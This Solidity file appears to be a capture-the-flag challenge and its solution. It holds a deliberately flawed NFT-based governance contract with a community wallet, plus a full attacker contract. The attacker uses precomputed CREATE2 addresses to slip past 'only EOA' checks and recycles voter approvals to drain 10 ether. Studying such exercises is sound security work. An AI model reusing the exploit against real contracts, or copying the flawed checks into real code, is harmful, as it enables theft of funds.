// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    /// @dev my ERC721 does not have this for some reason
    // function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
    //     require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    // }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res, ) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res, ) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}

contract GovernanceAttacker {
    function attack(Governance governance) public {
        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
        uint256 proposalId = uint256(keccak256(proposal));

        uint nonce = 1;
        address[] memory preCalcedVotersA = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
        address[] memory preCalcedVotersB = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5, 10);
        address preCalcedViceroy = getViceroyAddress(governance, proposal, preCalcedVotersA);

        // elect viceroy
        governance.appointViceroy(preCalcedViceroy, nonce);

        // deploy viceroy
        AttackerViceroy viceroy = deployViceroyAttack(governance, proposal, preCalcedVotersA);

        // deploy voter
        deployVoters(0, 5);

        // vote
        for (uint i; i < preCalcedVotersA.length; i++) {
            AttackerVoter(preCalcedVotersA[i]).vote(governance, proposalId, address(viceroy));
        }

        // dissaprove old voters
        viceroy.disapproveVoters();

        // approve new voters
        viceroy.approveNewVoters(preCalcedVotersB);

        // deploy new voter
        deployVoters(5, 10);

        // vote with new voters
        for (uint i; i < preCalcedVotersB.length; i++) {
            AttackerVoter(preCalcedVotersB[i]).vote(governance, proposalId, address(viceroy));
        }

        // execute proposal
        governance.executeProposal(proposalId);
    }

    function deployViceroyAttack(
        Governance governance,
        bytes memory proposal,
        address[] memory voters
    ) internal returns (AttackerViceroy) {
        uint nonce = 1;
        return new AttackerViceroy{salt: bytes32(nonce)}(governance, proposal, voters);
    }

    function getViceroyAddress(
        Governance governance,
        bytes memory proposal,
        address[] memory voters
    ) internal view returns (address) {
        uint nonce = 1;
        bytes memory viceroyCreationCode = abi.encodePacked(
            type(AttackerViceroy).creationCode,
            abi.encode(governance, proposal, voters)
        );
        return getCreate2Address(viceroyCreationCode, nonce);
    }

    function deployVoters(uint startIndex, uint endIndex) internal {
        for (uint i = startIndex; i < endIndex; i++) {
            new AttackerVoter{salt: bytes32(i)}();
        }
    }

    function getPreCalculatedAddresses(
        bytes memory bytecode,
        uint startIndex,
        uint endIndex
    ) internal view returns (address[] memory) {
        address[] memory addresses = new address[](endIndex - startIndex);
        for (uint i = startIndex; i < endIndex; i++) {
            addresses[i - startIndex] = getCreate2Address(bytecode, i);
        }
        return addresses;
    }

    function getCreate2Address(bytes memory contractCreationCode, uint _salt) internal view returns (address) {
        // get a hash concatenating args passed to encodePacked
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff), // 0
                address(this), // address of factory contract
                _salt, // salt
                keccak256(contractCreationCode) // contract creation bytecode of contract to be deployed
            )
        );

        // Cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }
}

contract AttackerViceroy {
    Governance governance;
    address[] voters;

    constructor(Governance _governance, bytes memory proposal, address[] memory _voters) {
        governance = _governance;
        voters = _voters;

        governance.createProposal(address(this), proposal);
        for (uint i; i < voters.length; i++) {
            address voter = voters[i];
            governance.approveVoter(voter);
        }
    }

    function disapproveVoters() public {
        for (uint i; i < voters.length; i++) {
            address voter = voters[i];
            governance.disapproveVoter(voter);
        }
    }

    function approveNewVoters(address[] memory _newVoters) public {
        for (uint i; i < _newVoters.length; i++) {
            address voter = _newVoters[i];
            governance.approveVoter(voter);
        }
    }
}

contract AttackerVoter {
    function vote(Governance governance, uint256 proposalId, address viceroy) public {
        governance.voteOnProposal(proposalId, true, viceroy);
    }
}